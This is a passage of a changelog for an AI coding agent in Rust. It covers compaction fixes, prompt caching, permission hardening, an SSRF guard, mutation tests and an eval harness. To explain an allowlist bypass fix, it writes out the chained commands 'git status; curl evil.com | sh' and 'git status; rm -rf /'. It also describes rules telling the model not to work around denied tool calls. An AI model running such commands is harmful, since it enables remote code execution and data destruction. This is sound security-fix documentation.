  `stop`, and the authoritative oracle expose run/failure/retry/rollback counters
  in session telemetry, `[usage]`, `audit`, and `stats`. Ablations are available
  through `SIRBONE_DISABLE=hook:pre,hook:post,hook:stop,oracle:gate,ask:rounds`.
- **Contextual question rounds** — `ask_user` now publishes explanatory option
  consequences and can group 1–3 independent questions behind the experimental
  `SIRBONE_ASK_ROUNDS=1` flag. Historical single-question payloads remain
  deserializable; TUI and stream-JSON can return one structured aggregate reply.
- **Deterministic claim grounding** — `sirbone ground <file>` (or no-arg = the
  latest session's final answer) checks a plan/doc's claims about the codebase
  (paths / symbols / counts) against the actual code with **no model in the
  loop**, prints the verified facts, and exits non-zero on a divergence (a path
  that doesn't exist, a wrong count) so it can gate CI. `SIRBONE_GROUND=1` prints
  the same report after a one-shot run. Engine: `src/agent/grounding.rs`; also
  front-loads the real location+signature of the entities the prompt names into
  the initial context (`prompt_context`) for a more linear run.
- **`verify` tool (LLM-callable) + `/verify` `/oracle` `/plan` slash commands**.
  `verify` runs the project's configured test command (`oracle.test_command`) on
  demand and reports pass/fail with the failing lines hoisted; it is registered
  only when that command exists, so the model
  self-checks before finishing. `/plan` is a REPL toggle that asks the model to
  record a SPEC (Goal / Files / Steps / Risks) before editing; `/oracle` toggles
  the post-Done test gate.
- **Token-usage accounting** (`SIRBONE_USAGE=1`). At the end of a one-shot run
  sirbone prints `[usage] calls=N input_tokens=… cached_tokens=… peak_context=…`,
  summing the real per-call prompt size across the agentic loop. Fixes zero
  counts on Anthropic-compatible endpoints (z.ai) that report usage in the final
  `message_delta` rather than `message_start`.
- **Prompt-cache visibility on both providers**. `ContextUsage` now carries
  `cached_tokens`; the TUI info bar shows the cache-hit share (`⚡N%`) next to
  the context gauge. Anthropic reports `cache_read_input_tokens` (and
  `used_tokens` is now the full prompt: uncached + cache read/write, not just
  the uncached remainder); the OpenAI-compatible client requests
  `stream_options.include_usage` and reads
  `prompt_tokens_details.cached_tokens` (OpenAI-style caching is automatic
  server-side — this is the only visibility into it).

### Known issues

- **A compaction can drop the task's closing instruction.** Compaction itself
  fires correctly and the window it keeps is well formed, but in a smoke run on
  2026-08-11 the summariser transcribed the conversation instead of filling in
  the sections it is asked for — `[Tool result]:` / `[Assistant]:` prefixes
  copied through, no "User requests and constraints" heading — and the
  instruction the user had given at the start of the run did not survive into
  the summary. The run ended by asking what to summarise next rather than
  finishing the task. This is not plumbing: the summariser prompt does reach the
  provider's `system` field. Long sessions that cross the compaction threshold
  can therefore lose the ask; re-stating it after a compaction is the workaround
  until the cause is isolated.

### Changed

- **Oracle activation is explicit outside the TUI.** Configuration does not
  silently enable the post-`Done` gate in headless/REPL runs: use `--oracle` or
  `SIRBONE_ORACLE=1`. The TUI retains the persisted per-project `/oracle` toggle.
  The retry loop and rollback-on-regression behavior are unchanged.

### Removed

- **`--plan` CLI flag** (replaced by the `/plan` slash command and `todo` tool).
- **7 low-ROI tools** — `find`, `ls`, `sed`, `wait`, `plan`, `fetch_docs`,
  `save_skill`. Subsumed by `bash`+core or unused (decided by a real
  usage-frequency scan, not by eye); fewer always-on tools = less model
  confusion. Registry ~22 → ~15.
- **`SIRBONE_VERIFY`** (LLM claim-auditor pass) — superseded by the deterministic
  `sirbone ground` / `SIRBONE_GROUND` (no second model, can't itself hallucinate).

### Fixed

- **The compaction summary's "Files modified" list no longer shrinks.** It is
  derived from the mutating tool calls in the window being summarized, and that
  window is gone by the next compaction — so on a long session the list narrowed
  to whatever the latest window happened to touch, and a file edited early
  stopped being mentioned. The union is now accumulated in Rust across
  compactions rather than re-derived from the previous summary's prose. It is
  process-local: resuming with `--session` restarts the accumulation, and the
  earlier summary text still carries its own list.

- **Compaction no longer cuts in the middle of a turn.** The split point was a
  token-budget index, so the window that survived could open on the agent's own
  half-finished work while the request that motivated it was summarized away.
  The boundary is now pulled back to the start of the turn it landed in — and
  only when the extra messages fit the same budget, since compacting badly still
  beats not compacting at all. Messages sirbone writes for itself (oracle
  retries, stop-hook reasons, stream-rule reminders) travel as user messages
  because that is the only channel providers offer; they now carry an explicit
  `injected` flag, so a turn boundary is a structural fact rather than something
  guessed from the message text.

- **Command-injection bypass in the permission allowlist** (`src/permissions.rs`).
  Allow globs and the safe-readonly check matched the raw command string, so
  `git status; curl evil.com | sh` rode in on `Bash(git status*)` and
  `git status; rm -rf /` passed as read-only. Bash commands are now split on
  chaining operators (quote-aware); every segment must pass the allow list on
  its own, and substitution constructs (`$(…)`, backticks, `<(…)`) never
  auto-allow. `soft_deny` fires on any matching segment.

### Changed

- **Conversation history is now prompt-cached** (`src/ai/anthropic.rs`). A
  `cache_control` breakpoint on the final message block lets each request
  reuse the previous turn's prefix (~0.1× input price); previously only
  system+tools were cached and the whole history was re-read at full price
  every turn.
- **Compaction summary preserves intent** (`src/agent.rs`). The summarizer
  prompt grows from 4 to 8 sections: ordered user requests with
  security-relevant constraints kept verbatim, errors and fixes, failed
  approaches, and a next step anchored to a verbatim quote — so compaction no
  longer drops corrections, constraints, or dead ends.
- **Denied tool calls now carry recovery guidance** (`src/agent.rs`). The
  blocked tool result tells the model to pursue the goal another legitimate
  way without working around the denial, or stop and ask.

- **Prompt hardening** (`src/tools/*.rs`, `src/main.rs`). Tool descriptions for
  `bash`, `read`, `write`, `edit`, `grep` and `glob` now carry usage guidance
  adapted from Claude Code's prompt catalog (fresh shell per bash call — use
  absolute paths and `&&`; prefer dedicated tools over cat/grep/find/sed via
  bash; no destructive git ops or `--no-verify`; read before edit/overwrite).
  The system prompt gains three behavioral guardrails (no unnecessary
  additions, outcome-first concise replies, truthful reporting with
  `file:line` code references) — deliberately capped at three, since
  instruction-following degrades as rule count grows.

### Added

- **Workspace snapshots + `/rollback`** (`src/snapshot.rs`). A shadow git repo
  under `~/.sirbone/projects/<slug>/snapshots.git` (the user's own `.git` is
  never touched; non-git projects work too) commits the whole work-tree once
  per agent run, lazily before the first mutating tool call — covering bash
  side effects the per-file `undo` tool can't see. `/rollback` (REPL + TUI)
  lists snapshots and restores one (`read-tree` + `checkout-index` + `clean`,
  so files created after the snapshot are removed); a safety snapshot first
  makes every rollback itself reversible. Disable: `SIRBONE_NO_SNAPSHOT=1`.
- **Post-edit auto-checks** (`src/checks.rs`). Config key `post_edit_check`
  (`~/.sirbone/config.json`) maps path globs to fast lint commands, e.g.
  `{"*.rs": "cargo check -q --message-format=short"}`. After a mutating tool
  batch, matching commands run once (deduplicated, 30s timeout) and failures
  ride the last tool result inline — the model fixes breakage in the same turn
  instead of discovering it edits later. Advisory: never reverts, never blocks;
  no config = no checks.
- **Trajectory metrics + pass^k in the eval harness** (`bench/eval_harness/`).
  `agentic_cost.py` now extracts two deterministic trajectory signals from
  transcripts — loop detection (≥3 consecutive identical tool calls with the
  same result head) and repro-before-edit (did bash run before the first
  mutation) — both advisory, folded into `eval_*.json` by `run_eval.py`.
  `report.py` prints pass^k vs pass@k over the per-seed flips (the consistency
  gap = share of instances solved inconsistently across seeds). Unit tests in
  `test_agentic_cost.py`.
- **SSRF guard on `web_fetch`** (`src/tools/web_fetch.rs`). URLs are vetted before
  curl runs: http/https only (`--proto =http,https`), private/internal addresses
  rejected (loopback, RFC1918, link-local incl. 169.254.169.254 cloud metadata,
  unspecified, multicast, IPv6 ULA/link-local, v4-mapped), and domain names are
  DNS-resolved with the vetted IP pinned via `--resolve` to block rebinding.
  Escape hatch for local dev servers: `SIRBONE_WEB_FETCH_ALLOW_PRIVATE=1`.
- **Secret redaction in logs** (`src/ai/mod.rs`). `redact_secrets` replaces known
  API key/token values (from `ANTHROPIC_AUTH_TOKEN`, `ANTHROPIC_API_KEY`,
  `OPENAI_API_KEY`, `SIRBONE_ARCHITECT_API_KEY`) with `[redacted]` in retry
  warnings, API error bodies, and the OpenAI error event.
- **Fuzzy edit matching** (`src/tools/edit.rs`). `edit` now falls back from exact
  substring match to whitespace-tolerant line matching: first ignoring trailing
  whitespace, then leading+trailing (re-indenting the replacement to the file's
  indentation). Each pass still requires a unique match; ambiguity and not-found
  remain errors.
- **Compaction persisted to sessions** (`src/session.rs`, `src/agent.rs`,
  `src/types.rs`). `compact()` emits `AgentEvent::Compacted` with the post-
  compaction transcript; CLI and TUI append it as a `SessionEntry::Compaction`
  checkpoint, and `session::collapse` rebuilds the compacted transcript on
  load/resume instead of replaying the full raw history.

### Changed

- **No `unwrap()` outside tests.** All 20 non-test `unwrap`/`expect` sites were
  removed or justified: lock acquisitions now go through poison-recovering
  helpers (`lock_or_recover`/`read_or_recover`/`write_or_recover` in
  `src/types.rs` — a poisoned lock yields its data instead of cascading the
  panic), guard-protected unwraps became `let-else`/`if let` flows (`undo.rs`
  pop, `/model` prefix parse, architect key), and `main()` setup errors
  propagate with `?` + context. The two remaining `expect`s are compile-time
  static regexes in `structure.rs` with messages naming the invariant.

### Fixed

- **Slice panic after mid-run compaction.** Both the CLI and TUI persisted new
  messages with `&messages[n_before..]`; compaction shrinks the transcript below
  `n_before`, panicking the writer. Persistence now starts from the compaction
  checkpoint when one occurred (`get(..).unwrap_or(&[])` either way).

- **OpenAI client mutation-tested 38% → 83%** (`src/ai/client.rs`; 5 tests). New
  `httpmock` tests assert that `run_turn` sends the conversation, tools, and model
  in the request, parses streamed text + tool-call deltas, and does not retry a
  4xx; plus `list_models` parsing and `set_model` propagation. Remaining survivors
  are the retry-loop timing boundary and the network-error `is_retryable` arm
  (need real connection failures / multi-second sleeps) — documented debt.
- **`truncate_output` mutation-tested 66% → 100%** (`src/tools/truncate.rs`; 3
  tests). Exact head/tail/omitted-line accounting at chosen line/byte budgets
  pins the budget arithmetic (the `/2` split, `bytes + len + 1` accumulation, the
  `>` byte check) that the property tests left unpinned.
- **Anthropic client mutation-tested 28% → ~89%** (`src/ai/anthropic.rs`; 13 new
  tests). In-module tests pin the request mapping `to_anthropic_request` (roles,
  image/text/thinking/tool blocks, text-collapse, cached system + tools, thinking
  budget), the `handle_event` SSE arms, the runtime model/thinking-budget
  accessors, and each terminal/retryable branch of `stream_error_retryable`. New
  `httpmock` tests cover `list_models`, `count_tokens`, model-switch propagation,
  and a strengthened over-cap retry assertion (`after 1 attempts`). Remaining
  survivors are the retry-loop timing boundaries (need real network failures or
  multi-second backoff sleeps) and a debug-log guard (excluded as
  observability-only in `.cargo/mutants.toml`).
- **Agent-loop logic now mutation-tested to 100%** (`src/agent.rs`: 43% → 100%
  mutation score; 14 new tests). A crate-wide `cargo-mutants` audit found the
  agent loop's core logic largely unpinned — 40 surviving mutants. Added targeted
  tests for `estimate_context_tokens` (exact per-block accounting), `compact`
  (window boundary, prior-summary chaining, file-grounding + long-result
  truncation via a capturing client), `decide` (permission routing), `localize`,
  `nudge_if_stuck`, `switch_model`, and the `LlmClient` default methods. 0
  surviving mutants remain.
- **Property-based tests (`proptest`) for the pure parsers.** Generated-input
  coverage for `glob_matches` (star/literal/prefix/suffix/`a*b` invariants),
  `truncate_output` (passthrough within budget, truncation marker on overflow,
  never panics / never empties non-empty input), and `Message` serde round-trip +
  `extract_text` (concatenates only `Text` blocks, in order). Thousands of cases
  per property, in-module so private fns stay reachable.
- **Wire-level HTTP tests for the Anthropic client** (`tests/anthropic_http.rs`,
  via `httpmock`). The SSE streaming parser, tool-call accumulation from
  `partial_json`, multi-block index ordering, and the terminal error paths
  (stream `error` event, over-cap `retry-after`, non-2xx) were previously covered
  only by pure-helper unit tests — the most intricate code in the crate had no
  end-to-end coverage. 7 tests, all fast (no backoff sleeps).
- **Mutation-testing gate** (`.cargo/mutants.toml` + CI). The per-PR `cargo-mutants`
  job is now a **hard gate** on changed lines (was non-blocking): a surviving
  mutant on a diffed `src/` line fails the build. Config scopes mutation to
  `src/**` and documents one known-equivalent mutant. Run locally with
  `cargo mutants --in-place`.

### Fixed

- **Test-reliability gap in `permissions.rs` closed.** `cargo-mutants` flagged a
  surviving mutant: `PermissionConfig::load()` was never exercised against a real
  config file (tests only built configs in memory). Added a test that points
  `HOME` at a temp `~/.sirbone/config.json` and asserts the parsed allow/soft-deny
  rules — the file's only real test gap (the other flagged mutant is equivalent).
- **CI `cargo-deny` job unblocked.** Two unmaintained-only advisories with no safe
  upgrade now ignored in `deny.toml` with justification: `bincode 1.3.3`
  (RUSTSEC-2025-0141 — maintainer declares 1.x complete; used only for the local
  structure cache) and `paste 1.0.15` (RUSTSEC-2024-0436 — transitive via ratatui,
  no upstream fix). Neither is a vulnerability or reachable by untrusted input.

### Changed

- **OpenAI client retry hardening.** Replaced fragile substring matching on error
  text (`msg.contains("429")` …) with structured classification on the typed
  `OpenAIError` (network connect/timeout, 429, and 5xx retry; auth/bad-request are
  terminal). Retry backoff is now cancellable (Ctrl-C during the wait ends cleanly)
  and uses the same capped exponential schedule and `MAX_ATTEMPTS=5` as the
  Anthropic client. Added unit tests for the classifier and backoff.
- **Dropped unused dependencies** `thiserror` and `tokio-stream` from `Cargo.toml`
  (verified unreferenced via `cargo machete`).

- **Eval harness migrated from SWE-bench Lite to Aider polyglot.** Removed the
  SWE-bench code, data, and out-of-tree target repos; salvaged the
  benchmark-agnostic pieces (`report.py` gate, `composite.py`, `judge.py`,
  `rubric.yaml`). New `aider_dataset.py` / `run_inference_aider.py` /
  `verifiable_aider.py` run the agent **inside** an all-6-toolchain Docker image
  (`bench/eval_harness/docker/`) so it can self-test on every language. Layer-A
  runner validated on all 6 languages (reference solutions pass); agent path
  validated end-to-end on cpp/go/java/js/python/rust (6/6). See
  `docs/AIDER_HARNESS.md`; method unchanged (`docs/EVAL_HARNESS_PLAN.md`).
- **Agentic-cost gate axis** (`agentic_cost.py`, auto-added to `eval_*.json`; gated
  in `report.py`): mean tool-calls/exercise mined from transcripts. The right-axis
  signal for sirbone's tool/prompt/loop changes — sensitive where pass-rate
  saturates (hard subset costs more at equal pass-rate; failures cost 3–4×).
  `report.py` now gates on TWO bands: Layer-A resolved-rate (lower) and agentic
  cost (upper); RED if either trips. Resumable, quota-aware inference (stops
  cleanly on a real 429, resumes from the same `--out`).

### Added

- **Retry-loop breaker** — the agent loop now detects when the same failing tool call is
  repeated 3 times in a row (same tool + same arguments) and appends a one-shot
  strategy-change nudge to the last tool result, steering the model out of the "rabbit
  hole" instead of burning turns on an identical command.
- **Per-language debugging cheat-sheet** in the system prompt — gated to the languages
  actually present in the workspace, steering the model toward non-interactive/batch-mode
  debugging (the only kind the one-shot `bash` tool supports) and away from blocking
  interactive REPLs/watchers.

## [0.1.0] - 2026-06-05

Initial public release. Sir Bone is a from-scratch AI coding agent in Rust: it streams
LLM responses, executes tools, and renders output in REPL or TUI mode.

### Added

- **Agent loop** — explicit `Idle → ToolCalling → Idle → Done` state machine with parallel
  tool execution (`buffer_unordered`) and real context compaction at 87.5% of the window.
- **Providers** — `LlmClient` trait with Anthropic (SSE streaming, prompt caching, extended
  thinking) and OpenAI-compatible (`async-openai`) backends; auto-detected from env vars.
  Resilient send+stream retry with backoff and unit-tested error classification.
- **Tools** — bash, read, write, edit, sed, grep, glob, find, ls, web_fetch, web_search,
  load_skill, wait, note, undo, plus output truncation.
- **MCP** — generic stdio client that spawns servers from `~/.sirbone/config.json` and
  registers each remote tool as `mcp__<server>__<tool>`.
- **Permission pipeline** — allow/soft-deny globs + destructive-pattern detection + an LLM
  classifier for ambiguous bash commands, configurable via `~/.sirbone/config.json`.
- **TUI** (ratatui) — markdown/diff/table/mermaid rendering, braille boar animation,
  6 palettes, settings screen, append-only JSONL sessions with resume.
- **CLI/UX** — `--version`, rich `--help` (`long_about` + examples), shell completions
  (`--completions <SHELL>`), man page (`--man`), `--image` multimodal input, and a clear
  first-run message when no API key is set.
- **Packaging** — dual `MIT OR Apache-2.0` license + `NOTICE` crediting upstream
  [Pi](https://github.com/earendil-works/pi); complete `[package]` metadata with
  `rust-version = "1.88"` (verified MSRV).
- **CI** — `clippy -D warnings` + `test` + `build --release` + an MSRV build job +
  `cargo-deny` (licenses, advisories, bans, sources).

[Unreleased]: https://github.com/automataIA/sir-bone-rs/compare/v0.1.0...HEAD
[0.1.0]: https://github.com/automataIA/sir-bone-rs/releases/tag/v0.1.0
